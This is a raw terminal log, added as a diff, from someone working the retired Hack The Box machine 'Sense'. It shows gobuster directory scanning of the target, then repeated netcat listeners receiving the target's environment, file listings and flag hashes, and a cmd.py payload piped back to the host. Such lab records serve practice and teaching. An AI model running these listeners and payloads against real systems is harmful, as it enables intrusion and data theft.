@@ -1,0 +1,151 @@
+arjun@broly:~/Documents/HacktheBox/retired/sense$ /opt/gobuster/gobuster dir  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://10.10.10.60 -k -x txt      
+===============================================================                 
+Gobuster v3.0.1     
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)                 
+===============================================================                 
+[+] Url:            https://10.10.10.60 
+[+] Threads:        10                  
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403                                 
+[+] User Agent:     gobuster/3.0.1      
+[+] Extensions:     txt                 
+[+] Timeout:        10s                 
+===============================================================                 
+2019/12/23 21:41:56 Starting gobuster   
+===============================================================                 
+/themes (Status: 301)                   
+/css (Status: 301)  
+/includes (Status: 301)                 
+/javascript (Status: 301)               
+/changelog.txt (Status: 200)            
+/classes (Status: 301)                  
+/widgets (Status: 301)                  
+/tree (Status: 301) 
+/shortcuts (Status: 301)                
+/installer (Status: 301)                
+/wizards (Status: 301)                  
+/csrf (Status: 301) 
+/system-users.txt (Status: 200)         
+/filebrowser (Status: 301)              
+/%7Echeckout%7E (Status: 403)           
+===============================================================                 
+2019/12/23 22:25:41 Finished            
+===============================================================                 
+arjun@broly:~/Documents/HacktheBox/retired/sense$ ifconfig                      
+eth0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500                              
+        ether 2c:4d:54:27:8d:82  txqueuelen 1000  (Ethernet)                    
+        RX packets 0  bytes 0 (0.0 B)   
+        RX errors 0  dropped 0  overruns 0  frame 0                             
+        TX packets 0  bytes 0 (0.0 B)   
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0              
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536                                    
+        inet 127.0.0.1  netmask 255.0.0.0                                       
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>                            
+        loop  txqueuelen 1000  (Local Loopback)                                 
+        RX packets 124429  bytes 388330681 (370.3 MiB)                          
+        RX errors 0  dropped 0  overruns 0  frame 0                             
+        TX packets 124429  bytes 388330681 (370.3 MiB)                          
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0              
+
+tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500              
+        inet 10.10.14.24  netmask 255.255.254.0  destination 10.10.14.24        
+        inet6 dead:beef:2::1016  prefixlen 64  scopeid 0x0<global>              
+        inet6 fe80::8984:534c:1112:b0f8  prefixlen 64  scopeid 0x20<link>       
+        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 100  (UNSPEC)            
+        RX packets 1575321  bytes 373529097 (356.2 MiB)                         
+        RX errors 0  dropped 0  overruns 0  frame 0                             
+        TX packets 1183592  bytes 139696312 (133.2 MiB)                         
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0              
+
+wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500                     
+        inet 192.168.0.12  netmask 255.255.255.0  broadcast 192.168.0.255       
+        inet6 2605:6000:6285:7200::1  prefixlen 128  scopeid 0x0<global>        
+        inet6 fe80::75bf:dc27:998a:f6a7  prefixlen 64  scopeid 0x20<link>       
+        inet6 2605:6000:6285:7200:b564:d8d0:31eb:cdbf  prefixlen 64  scopeid 0x0<global>            
+        ether d0:57:7b:8c:5b:9a  txqueuelen 1000  (Ethernet)                    
+        RX packets 2224385  bytes 1251141904 (1.1 GiB)                          
+        RX errors 0  dropped 1  overruns 0  frame 0                             
+        TX packets 1391802  bytes 300827773 (286.8 MiB)                         
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0              
+
+arjun@broly:~/Documents/HacktheBox/retired/sense$ nc -lnvp 9001                 
+listening on [any] 9001 ...             
+connect to [10.10.14.24] from (UNKNOWN) [10.10.10.60] 17552                     
+OLDPWD=/            
+HOME=/              
+PHP_FCGI_MAX_REQUESTS=500               
+PATH=/sbin:/bin:/usr/sbin:/usr/bin:/usr/local/bin:/usr/local/sbin               
+LANG=en_US.ISO8859-1                    
+PHP_FCGI_CHILDREN=1 
+PWD=/var/db/rrd     
+arjun@broly:~/Documents/HacktheBox/retired/sense$ nc -lnvp 9001                 
+listening on [any] 9001 ...             
+connect to [10.10.14.24] from (UNKNOWN) [10.10.10.60] 41467                     
+ippsec              
+arjun@broly:~/Documents/HacktheBox/retired/sense$ nc -lnvp 9001                 
+listening on [any] 9001 ...             
+connect to [10.10.14.24] from (UNKNOWN) [10.10.10.60] 55757                     
+/ippsec             
+arjun@broly:~/Documents/HacktheBox/retired/sense$ nc -lnvp 9001                 
+listening on [any] 9001 ...             
+connect to [10.10.14.24] from (UNKNOWN) [10.10.10.60] 25346                     
+d08c32a5d4f8c8b10e76eb51a69f1a86        
+arjun@broly:~/Documents/HacktheBox/retired/sense$ nc -lnvp 9001                 
+listening on [any] 9001 ...             
+connect to [10.10.14.24] from (UNKNOWN) [10.10.10.60] 14359                     
+.snap               
+rohit               
+arjun@broly:~/Documents/HacktheBox/retired/sense$ nc -lnvp 9001                 
+listening on [any] 9001 ...             
+connect to [10.10.14.24] from (UNKNOWN) [10.10.10.60] 18989                     
+.snap               
+rohit               
+arjun@broly:~/Documents/HacktheBox/retired/sense$ nc -lnvp 9001                 
+listening on [any] 9001 ...             
+connect to [10.10.14.24] from (UNKNOWN) [10.10.10.60] 41450                     
+.tcshrc             
+user.txt            
+arjun@broly:~/Documents/HacktheBox/retired/sense$ nc -lnvp 9001                 
+listening on [any] 9001 ...             
+connect to [10.10.14.24] from (UNKNOWN) [10.10.10.60] 19117                     
+8721327cc232073b40d27d9c17e7348barjun@broly:~/Documents/HacktheBox/retired/senst
+listening on [any] 9001 ...m.txt                                                
+connect to [10.10.14.24] from (UNKNOWN) [10.10.10.60] 3960                      
+arjun@broly:~/Documents/HacktheBox/retired/sense$ less filesystem.txt           
+arjun@broly:~/Documents/HacktheBox/retired/sense$ nc -lnvp 9001                 
+listening on [any] 9001 ...             
+connect to [10.10.14.24] from (UNKNOWN) [10.10.10.60] 52697                     
+
+arjun@broly:~/Documents/HacktheBox/retired/sense$ nc -lnvp 9001                 
+listening on [any] 9001 ...             
+connect to [10.10.14.24] from (UNKNOWN) [10.10.10.60] 32415                     
+-                   
+arjun@broly:~/Documents/HacktheBox/retired/sense$ nc -lnvp 9001                 
+listening on [any] 9001 ...             
+connect to [10.10.14.24] from (UNKNOWN) [10.10.10.60] 60373                     
+OLDPWD=/            
+HOME=/              
+PHP_FCGI_MAX_REQUESTS=500               
+PATH=/sbin:/bin:/usr/sbin:/usr/bin:/usr/local/bin:/usr/local/sbin               
+LANG=en_US.ISO8859-1                    
+PHP_FCGI_CHILDREN=1 
+PWD=/var/db/rrd     
+arjun@broly:~/Documents/HacktheBox/retired/sense$ nc -lnvp 9001                 
+listening on [any] 9001 ...             
+connect to [10.10.14.24] from (UNKNOWN) [10.10.10.60] 19763                     
+arjun@broly:~/Documents/HacktheBox/retired/sense$ vim cmd.py                    
+arjun@broly:~/Documents/HacktheBox/retired/sense$ nc -lnvp 9001 < cmd.py        
+listening on [any] 9001 ...             
+^C                  
+arjun@broly:~/Documents/HacktheBox/retired/sense$ vim cmd.py                    
+arjun@broly:~/Documents/HacktheBox/retired/sense$ nc -lnvp 9001 < cmd.py        
+listening on [any] 9001 ...             
+connect to [10.10.14.24] from (UNKNOWN) [10.10.10.60] 39657                     
+arjun@broly:~/Documents/HacktheBox/retired/sense$ nc -lnvp 1234                 
+listening on [any] 1234 ...             
+^C                  
+arjun@broly:~/Documents/HacktheBox/retired/sense$ nc -lnvp 9001 < cmd.py        
+listening on [any] 9001 ...             
+connect to [10.10.14.24] from (UNKNOWN) [10.10.10.60] 63087                     
+arjun@broly:~/Documents/HacktheBox/retired/sense$                               
